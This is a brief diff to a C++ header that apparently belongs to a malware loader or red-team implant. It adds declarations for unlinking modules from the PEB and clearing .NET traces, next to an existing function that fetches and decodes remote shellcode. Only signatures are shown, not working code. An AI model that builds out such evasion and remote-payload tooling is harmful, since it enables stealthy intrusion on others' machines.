@@ -4,6 +4,7 @@
 #include <string>
 #include <vector>
 #include "http.hpp"
+#include <algorithm>
 
 class helper {
 
@@ -35,8 +36,9 @@ public:
     
 
     unsigned char* getNtdll();
+    void UnlinkModuleFromPEB(std::wstring targetName);
     std::vector<unsigned char> fetchRemoteShellcodeAndDecode(const std::wstring& url, const std::wstring& file, unsigned char shellcode_key, bool https);
-   
+    void ClearDotNetFromPeb();
 };
 
 extern helper helperHandler;
